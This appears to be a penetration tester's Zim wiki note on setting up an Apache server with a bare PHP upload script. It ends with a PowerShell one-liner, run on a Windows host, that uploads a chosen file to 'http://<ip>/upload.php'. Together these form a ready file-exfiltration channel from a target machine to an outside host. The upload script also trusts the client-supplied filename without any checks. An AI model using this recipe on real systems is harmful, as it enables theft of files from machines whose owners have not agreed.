Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-10-18T16:10:56-05:00

====== Apache ======
Created Monday 18 October 2021


{{{code: lang="php" linenumbers="True"
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>

}}}


===== Usage =====
* Save the above script as upload.php in the webserver's webroot (apache2: [[/var/www/html]])
* Make sure the webserver is running, and correctly deals with php files
* The above script puts uploaded files  in the [[/var/www/uploads]] directory.
* Make sure it exists and is write-accessible by the www-data user
* Make sure the firewall allows connections on port 80

{{{code: lang="sh" linenumbers="True"
sudo mkdir /var/www/uploads ; sudo chown www-data:www-data /var/www/uploads
}}}


==== Starting apache2 ====
{{{code: lang="sh" linenumbers="True"
systemctl start apache2 
}}}


Run this snippet on the windows host

=== Http ===
{{{code: lang="sh" linenumbers="False"
powershell (New-Object System.Net.WebClient).UploadFile('http://<ip>/upload.php', '<filename>')
}}}



===== SEE =====
[[Tools:Windows:PowerShell]]
